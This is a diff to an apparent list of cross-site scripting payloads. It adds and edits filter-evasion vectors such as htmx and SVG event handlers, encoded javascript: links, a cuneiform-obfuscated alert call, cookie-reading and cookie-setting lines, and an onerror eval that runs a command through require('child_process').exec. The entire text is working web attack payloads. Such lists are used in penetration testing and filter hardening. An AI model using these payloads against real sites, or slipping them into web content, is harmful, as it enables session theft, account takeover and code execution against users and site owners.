@@ -1,8 +1,17 @@
+<img src=x hx-on:htmx:load='alert(0)' />
+<input id=input name=cookieName value=cookieValue><script>cookieStore.set(input);</script>
+<svg><use><set atrributeName="href" to="data:image/svg+xml,&lt;svg id='x' xmlns='http://w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
+x(""+{a:location=name}+"")
+x(""+new class b{toString=e=>location=name}+"")
+<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
+<A href="javascrip%09t&colon;eval.apply`${[jj.className+`(23)`]}`" id=jj class=alert>Click Here
+<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
+<script>confirm("$\x0e\xce\xa0\xd4\xc7\xcb\x08")/script>;
 <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
 <svg onload=prompt%26%23x000000028;document.domain)>
 <svg onload=prompt%26%230000000040document.domain)>
 <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
-<svg%0Aonauxclick=0;[1].some(confirm)
+<svg%0Aonauxclick=0;[2].some(confirm)
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
 alert?.(document?.cookie)
